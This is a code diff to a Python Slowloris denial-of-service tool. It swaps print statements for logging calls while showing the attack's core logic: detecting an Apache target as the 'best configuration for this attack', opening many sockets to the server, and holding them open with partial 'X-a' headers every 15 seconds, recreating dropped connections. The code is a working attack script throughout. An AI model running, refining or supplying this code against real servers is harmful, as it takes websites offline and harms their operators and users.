@@ -10,6 +10,7 @@ import requests
 class Connection:
 
     sockets_list = []
+    log = logging.getLogger(__name__)
     def __init__(self,target_info):
         self.target_info : Target = target_info
 
@@ -23,16 +24,16 @@ class Connection:
             sock.shutdown(1)
             sock.close()
         except: 
-            print("No Webserver detected, please verify your target adresse")
+            self.log.warning("No Webserver detected, please verify your target adresse")
             sys.exit()
             return None
         for line in response.split("\r\n"):
             if line.startswith("Server:"):
                 ws = line.split("Server:")[1].strip()
                 if ws.startswith("Apache"):
-                    print("[{}] server running with Apache, best configuartion for this attack".format(self.target_info.host))
+                    self.log.info("[{}] server running with Apache, best configuartion for this attack".format(self.target_info.host))
                 else:
-                    print("[{}] serveur running with {} , Not best configuration".format(self.target_info.host,ws))
+                    self.log.info("[{}] serveur running with {} , Not best configuration".format(self.target_info.host,ws))
         return None
     
     def init_socks(self):
@@ -58,35 +59,34 @@ class Connection:
             try:
                 s = self.init_socks()
             except socket.error as e:
-                print(e)
+                self.log.warning(e)
                 break
             self.sockets_list.append(s)
-        print("{} connections {} initialised".format(len(self.sockets_list),self.target_info.sockets_number))
+        self.log.info("{} connections {} initialised".format(len(self.sockets_list),self.target_info.sockets_number))
         while True:
             try:
-                print("Sending header with {} sockets".format(len(self.sockets_list)))
+                self.log.info("Sending header with {} sockets".format(len(self.sockets_list)))
                 for s in list(self.sockets_list):
                     try:
                         s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                     except socket.error:
                         self.sockets_list.remove(s)
-                
-                print("try recreating sockets")
+                self.log.info("try recreating sockets")
                 for _ in range(self.target_info.sockets_number - len(self.sockets_list)):
                     try:
                         s = self.init_socks()
                         if s:
                             self.sockets_list.append(s)
                     except socket.error as e:
-                        print(e)
+                        self.log.warning(e)
                         break
-                print("{} connections {} initialised".format(len(self.sockets_list),self.target_info.sockets_number))
+                self.log.info("{} connections {} initialised".format(len(self.sockets_list),self.target_info.sockets_number))
                 if not latence.is_alive():
                     latence.run()
                 time.sleep(15)
 
             except (KeyboardInterrupt, SystemExit):
-                print("Stopping Slowloris")
+                self.log.info("Stopping Slowloris")
                 avg = latence.get_average()
-                print("Average latency = {}".format(avg))
+                self.log.info("Average latency = {}".format(avg))
                 break
